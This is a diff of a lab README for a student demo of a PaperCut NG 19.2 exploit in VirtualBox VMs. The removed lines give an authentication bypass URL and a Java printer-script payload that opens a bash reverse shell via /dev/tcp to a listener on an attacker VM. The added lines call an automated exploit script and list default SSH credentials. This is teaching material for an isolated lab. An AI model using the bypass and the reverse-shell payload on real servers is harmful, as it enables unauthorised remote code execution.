@@ -4,8 +4,7 @@
 
 1. Download and unzip the files directory.
 
-- [Download link](https://hogent-my.sharepoint.com/:u:/g/personal/tuur_lammens2_student_hogent_be/IQD9ys_iPgBaRbVHIWtT64qjAVXEZbs4Yayvq5ibPBAzgQw?e=CsNsXj)
-  - ==NOTE== moet kali dvi nog toevoegen!
+- [Download link](https://hogent-my.sharepoint.com/:u:/r/personal/tuur_lammens2_student_hogent_be/Documents/lessen/csv/PVE%20taak/files.tar.gz?csf=1&web=1&e=wfjfqP)
 - This contains the Papercut NG 19.2.7 install script and a lightly modified vdi drive.
 - The vdi drive had network adapters configured. That is everything. ip is `192.168.100.50`
 
@@ -14,6 +13,7 @@
 ```txt
 .
 ├── files/
+│   ├── CSV_Kali_Demo.vdi
 │   ├── CSV_PaperCut_Exploit_Demo.vdi
 │   └── pcng-setup-19.2.6.9220-linux-x64.sh
 ├── static/
@@ -28,79 +28,24 @@
 - The set ip does not matter, the script automatically changes this.
 - **But the network itself should exist!**
 
-4. If everything is configured correctly, you can run `./install-kali.sh && ./install-ubuntu.sh`.
+4. If everything is configured correctly, you can run `./install-ubuntu.sh && ./install-kali.sh`.
+5. After the configuration of the Ubuntu server is complete, open the [web ui](http://192.168.100.50:9191/) and initialize the admin account.
+6. Run the Ubuntu provisioning script again to add the dummy printers. `./install-ubuntu.sh`
 
 - If anything goes wrong during provisioning, it is good practace to stop and remove the VM.
   - The provisioning part is skipped if there is a VM with the same name.
 
 ## Exploit
 
-==NOTE==: moet aangepast worden!!!
+### Phase 1: Provisioning
 
-### Phase 1: The Bypass (Authentication)
+1. Open the Kali VM GUI and log in with username `kali` and password `kali`.
+2. Open the terminal and execute the exploit script with `./pwn_everything`.
+3. The script will execute everything and open a tmux session. The bottom-left pane shows papercut user access, the bottom-right pane shows the root user access.
 
-The vulnerability lies in how PaperCut handles the setup wizard. By hitting a specific URL, you can trick the server into thinking the initial setup is still in progress, allowing you to bypass the login screen entirely.
-
-1. **Navigate to the Web UI:** Open a browser and go to: `https://192.168.100.50:9192/app`
-2. **Initial admin creation:** Create an admin and go through the setup wizzard. None of the input fields matter since we will be bypassing. Log out afterwarts
-  - Before loggin out: enable scripting
-  - Go to **`Options > Config Editor`**
-    - `print.script.sandboxed` => 'N'
-    - `print-and-device.script.enabled` => 'Y'
-2. **Navigate to the bypass URL:** Open a browser and go to: `https://192.168.100.50:9192/app?service=page/SetupCompleted`
-3. **Verify Access:** You should see a "Setup Completed" message. Click the **Login** button or refresh the page. You should now be logged in as the `admin` user without having entered a password.
-
-### Phase 2: The Payload (RCE)
-
-Now that you have admin access, you will use the built-in "Printer Scripting" feature to execute system commands.
-
-1.  Go to **Printers** in the left sidebar.
-2.  Select the **template printer**.
-3.  Click the **Scripting** tab.
-4.  Check the box **Enable printer script** and replace the existing code with a Java-based reverse shell.
-
-**Example Payload:**
-
-```javascript
-var cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.100.60/4444 0>&1"];
-java.lang.Runtime.getRuntime().exec(cmd);
-
-function printJobHook(inputs, actions) {
-  // Empty
-}
-```
-
-### Phase 3: Triggering the Exploit
-
-1.  **Set up your listener:** On your host machine (not the VM), run:
-    `nc -lvnp 4444`
-2.  **Apply the Script:** In the PaperCut web interface, click **Apply**.
-3.  **Catch the Shell:** As soon as you hit apply, check your terminal. You should see a connection from the VM's IP, giving you a command prompt as the `papercut` user.
-
----
-
-## What the script does
-
-The `install.sh` script builds a ready-to-use demo VM in VirtualBox.
-
-It does these steps:
-
-- Checks if the vm exists already. if not:
-  - Creates a VM named `CSV_PaperCut_Exploit_Demo`.
-  - Copies the provided VDI disk into the VM folder.
-  - Configures VM hardware, networking, and shared folders.
-- Checks if vm is already running. If not:
-  - Starts the VM and waits for SSH access.
-- Checks if guest additions is already installed. If not:
-  - Installs required guest tools inside the VM.
-  - Reboots vm
-- Creates user `papercut`
-- Mounts this project folder inside the VM.
-- Runs the PaperCut installer automatically as papercut user.
-- Generate certificates for https access
-- Creates a dummy printer
-
-After it finishes, the VM is prepared as a demo environment.
+- You will initially only see papercut user access. Root acces will be granted after a system reboot. This cannot be done from the papercut user.
+- In a real-world scenario, you would just wait (to our knowledge). But for this demo you can ssh into the Ubuntu vm, from your host or from the Kali vm, with `ssh osboxes@192.168.100.50` and use the password `osboxes.org` and use `sudo reboot`.
+- The shutdown can take a while.
 
 ## Links
 
